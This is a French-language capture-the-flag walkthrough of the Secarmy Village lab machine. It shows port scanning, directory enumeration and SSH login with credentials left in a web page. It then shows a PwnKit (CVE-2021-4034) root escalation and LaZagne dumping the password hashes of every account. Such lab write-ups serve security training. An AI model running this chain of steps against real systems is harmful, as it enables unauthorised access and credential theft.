# Secarmy Village: Grayhat Conference

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $sudo massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.253
[i] Rate: 1000
 
🔥 Masscan 192.168.56.253...100%
👁️ Nmap 192.168.56.253...100%
 
[+] 21/tcp open
[+] 22/tcp open
[+] 80/tcp open
[+] 1337/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.253-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> **Gobuster**

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $gobuster dir -u http://192.168.56.253 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt,zip,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.253
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bak,php.bak,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/anon                 (Status: 301) [Size: 315] [--> http://192.168.56.253/anon/]
/index.html           (Status: 200) [Size: 267]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.56.253/javascript/]
/server-status        (Status: 403) [Size: 279]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

Le répertoire `anon` contient un identifiant

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $curl http://192.168.56.253/anon/
<html>
<head>
<title>Totally Secret Directory</title>
</head>
<body>
<center><b style="font-size: 32px;">Welcome to the hidden directory! <br>
<br>
Here are your credentials to make your way into the machine!
<br>
<br>
<font color="white">uno:luc10r4m0n</font>
</b></center>
</body>
</html>
```

&nbsp;

<span style="color: #dddddd;">🖥️</span> **Netexec**

Test de l’identifiant

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $nxc ssh 192.168.56.253 -u uno -p luc10r4m0n -x 'id'
SSH         192.168.56.253  22     192.168.56.253   [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
SSH         192.168.56.253  22     192.168.56.253   [+] uno:luc10r4m0n  Linux - Shell access!
SSH         192.168.56.253  22     192.168.56.253   [+] Executed command
SSH         192.168.56.253  22     192.168.56.253   uid=1001(uno) gid=1001(uno) groups=1001(uno)
SSH         192.168.56.253  22     192.168.56.253   
```

&nbsp;

**<span style="color: #dddddd;">🔒</span> SSH**

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $ssh uno@192.168.56.253
The authenticity of host '192.168.56.253 (192.168.56.253)' can't be established.
ED25519 key fingerprint is SHA256:yfzxQToG2YrT92Vr9iQN8VE7JC5lE1sCpjSbHYw3Jn4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.253' (ED25519) to the list of known hosts.
uno@192.168.56.253's password: 
 ________  _______   ________  ________  ________  _____ ______       ___    ___ 
|\   ____\|\  ___ \ |\   ____\|\   __  \|\   __  \|\   _ \  _   \    |\  \  /  /|
\ \  \___|\ \   __/|\ \  \___|\ \  \|\  \ \  \|\  \ \  \\\__\ \  \   \ \  \/  / /
 \ \_____  \ \  \_|/_\ \  \    \ \   __  \ \   _  _\ \  \\|__| \  \   \ \    / / 
  \|____|\  \ \  \_|\ \ \  \____\ \  \ \  \ \  \\  \\ \  \    \ \  \   \/  /  /  
    ____\_\  \ \_______\ \_______\ \__\ \__\ \__\\ _\\ \__\    \ \__\__/  / /    
   |\_________\|_______|\|_______|\|__|\|__|\|__|\|__|\|__|     \|__|\___/ /     
   \|_________|                                                     \|___|/      
                                                                                 
                                                                                 
 ___      ___ ___  ___       ___       ________  ________  _______               
|\  \    /  /|\  \|\  \     |\  \     |\   __  \|\   ____\|\  ___ \              
\ \  \  /  / | \  \ \  \    \ \  \    \ \  \|\  \ \  \___|\ \   __/|             
 \ \  \/  / / \ \  \ \  \    \ \  \    \ \   __  \ \  \  __\ \  \_|/__           
  \ \    / /   \ \  \ \  \____\ \  \____\ \  \ \  \ \  \|\  \ \  \_|\ \          
   \ \__/ /     \ \__\ \_______\ \_______\ \__\ \__\ \_______\ \_______\         
    \|__|/       \|__|\|_______|\|_______|\|__|\|__|\|_______|\|_______|         
                                                                                 
                                                                                 
WELCOME TO THE SECARMY OSCP GIVEAWAY MACHINE!,

https://secarmy.org/village/

THIS MACHINE HAS BEEN MADE AS PART OF THE SECARMY VILLAGE 
EVENT AND IS SPONSOSRED BY OUR GENEROUS SPONSOR OFFENSIVE
SECURITY. YOU ARE REQUIRED TO COMPLETE 10 TASKS IN ORDER TO 
GET THE ROOT FLAG. MAKE SURE THAT YOU JOIN OUR DISCORD SERVER
(bit.ly/joinsecarmy) IN ORDER TO SUBMIT THE FLAG AS WELL AS 
FOR SOLVING YOUR PROBLEMS OR QUERIES...

GOODLUCK!
uno@svos:~$ 
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
uno@svos:/tmp/fullEx$ bash fullEx.sh -perm
uno@svos:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

Exploit pour devenir root

```
uno@svos:/tmp/fullEx$ ./fullEx.sh -PwnKit64
root@svos:/tmp/fullEx# 
```

&nbsp;

Voyons si notre très chers amis trouve les mot de passe des utilisateurs

```
root@svos:/tmp/fullEx# ./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: uno
Hash: $6$1.3rol6j$fGsA/5YTLHSA58i6KDc.S/5A9b7.3L9w0kRnsOOpuWZPuOxaaHC4DsQXlopl8/9736xmQm4KETA3kQ87H7Ega.:18527:0:99999:7:::

[+] Hash found !!!
Login: ocho
Hash: $6$aXq/Dhe/$rFJE4bVIgGvGKLsHT/TjbwI/U0Wz1z8YE8OGh97wkJt1PTcZg7xlcHtV0oxmMqvA9ijjyvwAjGIVH.rSA3qZd1:18527:0:99999:7:::

[+] Hash found !!!
Login: cuatro
Hash: $6$TrqhWx2K$Eh9PseY/0ttNHV44NdYsp7Z5ogPZ22J8OENmUZjVsYryN0yfrDSUJ6EOhAOOLHWRsVksOcyk/Yxj/1dejGHMo0:18527:0:99999:7:::

[+] Hash found !!!
Login: seis
Hash: $6$s9NyNVld$Vbm2N08pS8WHSYNhux/aDc.EKG6zssVyk0PRKqhKZUtdt5VdIEinP9vHhK9er3jvT6LXhk8q5FtDX63FETYSr1:18532:0:99999:7:::

[+] Hash found !!!
Login: cero
Hash: $6$c6ZXgtp.$aDUKKG1gfY2sgZ7gH9s2O4FqYP5wxnCWBisqqMa0SSAXCXx6s7v6JZQJDiGY0pdOOq..2jFEfAPgZO3tdYn/A.:18554:0:99999:7:::

[+] Hash found !!!
Login: dos
Hash: $6$o6jl3TOi$HkPwu/0ISi1YJBC480Mib3VnBRJ2Q/R01XkX6vf9j4v580I6M1NN0M0tsBHW9RqBHi36hgYEQkgjiqdkWFdYk/:18527:0:99999:7:::

[+] Hash found !!!
Login: cinco
Hash: $6$YAnr5T4Y$NnKDpNPtIF/cgeKsgRX9qYQt4EzHijMkVYqPxsJqiwyzpgr9q0WLr00wqs06XAI8XphFJLXaFN3noBhiA16Oz1:18527:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$CCeUHJlY$0ClpmtE5GMymUVUNpJCIFtlVW4XjqHLX2BXeQoKs0VFSzZBREW6rlQmG4YSzlvb4i47OtX3vZkzk2p5HIcvpS1:18527:0:99999:7:::

[+] Hash found !!!
Login: siete
Hash: $6$moFZKk/c$xCBw246WpepYugkXZ5cxQ5WqLygTJXCac9lljE/Uz8dL1YHhU/qq3XG8oH2uswgt14pNmSpoKeQb56Jmg.Xyl/:18527:0:99999:7:::

[+] Hash found !!!
Login: tres
Hash: $6$.2CnBdsF$DduuioydFFphKoenaCsR.SZN3.uJMuQ/155oOIen0GQKmptKtFCNVtck4U.Xl4Fv5yLUH9E7.HZuH0dpB2SJQ.:18527:0:99999:7:::

[+] Hash found !!!
Login: nueve
Hash: $6$b73LJKfO$uIswdaX97E8feQzrdSBweudJ4JIlBI0epIZFspiuysW3ksgr6.iVTKnJvn2EQAYFVgxcCI.EnjGz4bfDxHZnA0:18527:0:99999:7:::

------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/


[+] 12 passwords have been found.
For more information launch it again with the -v option

elapsed time = 24.16151714324951

```

&nbsp;

Identifiant trouver

| User | password |
| --- | --- |
| uno | luc10r4m0n |

&nbsp;

&nbsp;

&nbsp;
